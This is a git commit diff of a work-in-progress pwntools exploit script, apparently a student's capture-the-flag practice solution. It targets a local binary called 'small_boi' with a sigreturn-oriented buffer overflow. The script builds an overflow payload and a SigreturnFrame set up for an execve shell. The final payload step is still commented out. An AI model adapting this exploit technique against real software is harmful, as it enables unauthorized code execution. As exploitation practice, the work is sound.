6356d5b4c9f6459e852aebb5a3d6e830d940bc74
Malachi Parks <Malachiparks1999@gmail.com>
2022-03-22 02:38:28 -0400

    Finding segments, just need to construct frame

--- PCPs/Pacecar18/answer.py
+++ PCPs/Pacecar18/answer.py
@@ -31,6 +31,7 @@ padding=b'a'*32
 padOverBP=b'a'*8
 systemCall = p64(0x0000000000400185)
 shell = p64(0x004001ca)
+sigRet = p64(0xf)
 
 # Generate ELF
 elf = ELF("./small_boi", checksec=False)
@@ -41,21 +42,34 @@ p=process("./small_boi")
 # setup stack!
 payload = padding
 payload += padOverBP 
-payload += p64(systemCall)  # Generate a system call
-payload += p64(0xf) #syscall 0xf is sigreturn
+payload += systemCall  # Generate a system call
+payload += sigRet #syscall 0xf is sigreturn
 
 # Send first payload to generate stack
 p.sendline(payload)
 
+print("Finding writeable segments!:")
+for x in range(0,len(elf.writable_segments)):
+    print("Segment %d:" %x, elf.writable_segments[x])
+    print("\t"+"Segment %d Data:" %x, elf.writable_segments[x].data())
+
 # Stack generation
 frame = SigreturnFrame()
 frame.rax = 59
-frame.rsp = ??
-frame.rbp = ??
-frame.rdi = ??
-frame.rsi = ??
-frame.rdx = ??
-frame.rip = ??
+frame.rsp = 0
+frame.rbp = 0
+frame.rdi = shell
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = 0
 
+
+
+'''
 # Craft payload 2
 payload2 = bytes(frame)
+
+# Send payload then interactive
+p.sendline(payload2)
+p.interactive()
+'''
